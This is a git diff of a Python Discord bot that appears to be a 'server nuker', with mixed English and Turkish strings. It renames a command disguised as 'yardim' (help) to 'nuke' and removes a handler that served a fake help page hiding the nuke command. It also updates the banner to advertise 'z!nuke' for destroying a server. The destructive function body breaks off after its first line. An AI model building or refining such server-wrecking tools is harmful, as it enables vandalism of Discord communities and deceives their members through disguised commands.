@@ -32,35 +32,23 @@ async def on_ready():
 ░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░   ▒░▒   ░   ░ ▒ ▒░     ░    
    ░   ░ ░  ░░░ ░ ░ ░ ░░ ░    ░       ░    ░ ░ ░ ░ ▒    ░      
          ░    ░     ░  ░      ░  ░    ░          ░ ░           
-         
-You can see the commands by typing z!help in the channel. / Herhangi bir kanala z!help yazarak komutları görebilirsiniz
+
+z!nuke chat to nuke the server. / chate z!nuke yazarak sunucuyu nukeleyin.
+
+z!help is a fake help page. / z!help sahte bir yardım sayfasıdır.
+
+z!stop is stoping the server nuke. / z!stop sunucuyu nukelemeyi durdurur.*
+
 ''')
 
 @client.command()
 @commands.is_owner()
-async def dur(ctx):
+async def stop(ctx):
     await ctx.bot.logout()
     print (Fore.GREEN + f"{client.user.name} başarıyla çıkış yaptı." + Fore.RESET)
 
-@client.event
-async def on_message(message):
-    if message.author == client.user:
-        return
-  
-    if message.author.bot:
-        return
-  
-    if message.content.lower() == 'z!help':
-        await message.channel.send('''
-**z!yardim chat to nuke the server. / chate z!yardim yazarak sunucuyu nukeleyin.**
-
-**z!help is a fake help page. / z!help sahte bir yardım sayfasıdır.**
-
-**z!commands stop server nuking. / z!commands sunucuyu nukelemeyi durdurur.**  
-''')
-
 @client.command()
-async def yardim(ctx):
+async def nuke(ctx):
     await ctx.message.delete()
     guild = ctx.guild
     try:
